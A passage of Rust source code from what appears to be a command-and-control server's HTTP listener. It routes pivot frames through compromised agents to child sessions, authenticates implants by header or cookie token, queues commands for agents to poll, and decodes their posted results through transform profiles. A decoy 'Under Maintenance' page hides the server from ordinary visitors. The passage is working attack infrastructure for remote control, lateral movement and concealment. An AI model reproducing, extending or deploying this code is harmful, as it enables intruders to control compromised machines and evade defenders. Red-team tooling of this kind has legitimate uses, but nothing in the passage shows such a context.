    if crate::server::session::parse_pivot_close_frame(&frame).is_some() {
        let peer_addr = remove_http_pivot(state, parent_id, child_id)
            .map(|pivot| pivot.peer_addr);
        let child_session_id = peer_addr.and_then(|peer_addr| state.sessions
            .iter()
            .find(|entry| {
                entry.value().parent_id == Some(parent_id) && entry.value().addr == peer_addr
            })
            .map(|entry| *entry.key()));
        if let Some(child_session_id) = child_session_id {
            state.sessions.remove(&child_session_id);
        }
        info!(parent = parent_id, pivot_id = child_id, "HTTP pivot listener stopped by agent");
        return;
    }

    let existing = {
        let pivots = state.pivot_sessions.lock().unwrap_or_else(|e| e.into_inner());
        pivots.get(&(parent_id, child_id)).map(|pivot| {
            pivot.last_seen.store(Utc::now().timestamp(), std::sync::atomic::Ordering::Relaxed);
            pivot.tx.clone()
        })
    };
    if let Some(tx) = existing {
        if !frame.data.is_empty() && tx.send(frame.data).is_err() {
            remove_http_pivot(state, parent_id, child_id);
        }
        return;
    }

    {
        let pivots = state.pivot_sessions.lock().unwrap_or_else(|e| e.into_inner());
        let count = pivots.keys().filter(|(parent, _)| *parent == parent_id).count();
        if count >= config().server.max_virtual_sessions {
            warn!(parent = parent_id, "HTTP pivot limit reached, ignoring child {}", child_id);
            return;
        }
    }

    let mut peer_addr = addr;
    if !frame.metadata.is_empty() {
        if let Ok(parsed) = frame.metadata.parse::<SocketAddr>() {
            peer_addr = parsed;
        }
    }

    let (server_half, bridge_half) = tokio::io::duplex(4096);
    let (child_tx, mut child_rx) = tokio::sync::mpsc::unbounded_channel::<Vec<u8>>();
    let child_last_seen = Arc::new(std::sync::atomic::AtomicI64::new(Utc::now().timestamp()));
    if !frame.data.is_empty() {
        let _ = child_tx.send(frame.data);
    }

    let state_bridge = state.clone();
    let bridge_task = tokio::spawn(async move {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let (mut bridge_read, mut bridge_write) = tokio::io::split(bridge_half);
        let mut buf = [0u8; 4096];
        loop {
            tokio::select! {
                n = bridge_read.read(&mut buf) => match n {
                    Ok(n) if n > 0 => {
                        let outbound = PivotFrame {
                            stream_id: 0,
                            destination: child_id,
                            source: 0,
                            data: buf[..n].to_vec(),
                            metadata: String::new(),
                        };
                        enqueue_http_pivot_frame(&state_bridge, parent_id, outbound);
                    }
                    _ => break,
                },
                message = child_rx.recv() => match message {
                    Some(data) => if bridge_write.write_all(&data).await.is_err() { break; },
                    None => break,
                }
            }
        }
    });

    state.pivot_sessions.lock().unwrap_or_else(|e| e.into_inner()).insert(
        (parent_id, child_id),
        HttpPivotSession { tx: child_tx, last_seen: child_last_seen, bridge_task, peer_addr },
    );

    let sessions = state.sessions.clone();
    let db = state.db.clone();
    let results = state.results.clone();
    tokio::spawn(async move {
        crate::server::session::handle_connection(
            crate::transport::C2Stream::Virtual(server_half),
            peer_addr,
            sessions,
            db,
            results,
            Some(parent_id),
        ).await;
    });
}

/// Fallback handler: serves C2 traffic or decoy page.
/// Agent identification is via the `X-Session-Token` header or `sid` cookie.
async fn handle_c2_or_decoy(
    State(state): State<Arc<HttpC2State>>,
    axum::extract::ConnectInfo(addr): axum::extract::ConnectInfo<SocketAddr>,
    headers: HeaderMap,
    method: axum::http::Method,
    body: Bytes,
) -> Response {
    // Try to extract session token from headers or cookies
    let token = headers.get("X-Session-Token")
        .and_then(|v| v.to_str().ok())
        .or_else(|| {
            headers.get("Cookie")
                .and_then(|v| v.to_str().ok())
                .and_then(|cookies| {
                    cookies.split(';')
                        .find_map(|c| {
                            let c = c.trim();
                            c.strip_prefix("sid=")
                        })
                })
        })
        .unwrap_or("");

    let session_id = {
        let inner = state.inner.lock().unwrap_or_else(|e| {
            tracing::error!("HttpC2State mutex poisoned during poll — recovering");
            e.into_inner()
        });
        inner.token_map.get(token).copied()
    };

    let sess_id = match session_id {
        Some(id) => id,
        None => return decoy_page().into_response(),
    };

    // Update last_seen
    if let Some(session) = state.sessions.get(&sess_id) {
        session.touch();
    }

    match method {
        axum::http::Method::GET => {
            let profile = profile_for_session(&state, sess_id);
            let items = drain_poll_items(&state, sess_id);
            let plaintext = if items.is_empty() {
                b"{\"status\":\"ok\",\"data\":[]}".to_vec()
            } else {
                serde_json::to_vec(&items).unwrap_or_default()
            };
            profile_get_response(&profile, plaintext)
        }
        axum::http::Method::POST => {
            let profile = profile_for_session(&state, sess_id);
            let decoded = match reverse_profile_body_transform(
                &body,
                &profile.http_post.data_transform,
            ) {
                Ok(body) => body,
                Err(_) => return (StatusCode::OK, "").into_response(),
            };
            match parse_http_outbound(&decoded) {
                Some(HttpOutboundItem::Pivot(frame)) => {
                    route_http_pivot_frame(&state, sess_id, addr, frame).await;
                }
                Some(HttpOutboundItem::Result(resp)) => {
                    crate::server::session::process_response(
                        sess_id, resp, &state.results, &state.db,
                    ).await;
                }
                None => {}
            }
            (StatusCode::OK, "").into_response()
        }
        _ => decoy_page().into_response(),
    }
}

/// Drain all queued commands for registration, which only accepts commands.
fn drain_commands(state: &HttpC2State, sess_id: u32) -> Vec<SecuredCommand> {
    let mut inner = state.inner.lock().unwrap_or_else(|e| e.into_inner());
    inner.cmd_queues.get_mut(&sess_id)
        .map(|queue| queue.drain(..).collect())
        .unwrap_or_default()
}

/// Drain one poll batch. Commands serialize as string-first seqs and pivot
/// frames as number-first seqs, matching the agent-side split_inbound.
#[doc(hidden)]
pub fn drain_poll_items(state: &HttpC2State, sess_id: u32) -> Vec<serde_json::Value> {
    let mut inner = state.inner.lock().unwrap_or_else(|e| e.into_inner());
    let mut items: Vec<serde_json::Value> = inner.cmd_queues
        .get_mut(&sess_id)
        .map(|queue| queue.drain(..).filter_map(|cmd| serde_json::to_value(cmd).ok()).collect())
        .unwrap_or_default();
    if let Some(queue) = inner.pivot_queues.get_mut(&sess_id) {
        items.extend(queue.drain(..).filter_map(|frame| serde_json::to_value(frame).ok()));
    }
    items
}

/// Decoy page for non-C2 traffic. Looks like a generic corporate site.
fn decoy_page() -> Html<&'static str> {
    Html(r#"<!DOCTYPE html><html><head><title>Site Maintenance</title>
<style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5}
.c{text-align:center;color:#666}h1{font-size:2em;color:#333}</style></head>
<body><div class="c"><h1>Under Maintenance</h1><p>This service is temporarily unavailable. Please try again later.</p></div></body></html>"#)
}